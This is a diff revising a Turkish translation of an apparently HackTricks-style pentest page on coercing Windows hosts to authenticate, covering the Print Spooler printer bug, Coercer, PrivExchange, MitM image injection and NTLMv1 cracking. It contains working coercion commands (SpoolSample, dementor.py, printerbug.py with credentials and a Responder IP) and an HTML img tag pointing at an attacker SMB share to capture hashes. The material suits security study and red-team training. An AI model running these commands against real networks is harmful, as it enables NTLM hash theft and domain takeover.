@@ -8,8 +8,8 @@
 
 ## Spooler Servisi İstismarı
 
-Eğer _**Print Spooler**_ servisi **etkinse,** bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilirsiniz ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
-Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** kullanacaktır.
+Eğer _**Print Spooler**_ servisi **etkinse,** bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusuna yeni yazdırma görevleri hakkında bir **güncelleme** **talep** edebilirsiniz ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
+Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
 
 ### Alan üzerindeki Windows Sunucularını Bulma
 
@@ -28,20 +28,20 @@ Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Servisten rastgele bir ana bilgisayara karşı kimlik doğrulaması yapmasını isteyin
+### Servisi rastgele bir ana bilgisayara kimlik doğrulaması yapması için isteyin
 
-Buradan **SpoolSample'ı derleyebilirsiniz**.
+[ **SpoolSample'ı buradan**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** derleyebilirsiniz.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-ve Linux'taysanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
+ve [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın eğer Linux'taysanız
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegation ile Birleştirme
 
-Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Sınırsız delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** sınırsız delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
+Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained delegation nedeniyle, **yazıcının bilgisayar hesabının TGT'si** unconstrained delegation ile bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Zorla Kimlik Doğrulama
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, Exchange sunucusunun, bir posta kutusuna sahip herhangi bir alan kullanıcısı tarafından HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlanmasını sağlar.
+`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.
 
-Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıkları vardır**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
+Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019 Öncesi Kümülatif Güncelleme'de alan üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Domain Admin'e anında erişim sağlar.
 
 ## Windows İçinde
 
@@ -98,13 +98,13 @@ ve açtığında, kimlik doğrulamaya çalışacaktır.
 
 ### MitM
 
-Eğer bir bilgisayara MitM saldırısı gerçekleştirebilir ve bir sayfaya HTML enjekte edebilirseniz, sayfada aşağıdaki gibi bir görüntü enjekte etmeyi deneyebilirsiniz:
+Eğer bir bilgisayara MitM saldırısı gerçekleştirebilirseniz ve onun göreceği bir sayfaya HTML enjekte ederseniz, sayfaya aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## NTLMv1 Kırma
 
 Eğer [NTLMv1 zorluklarını yakalayabilirseniz, onları nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+_NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._
 
 {{#include ../../banners/hacktricks-training.md}}
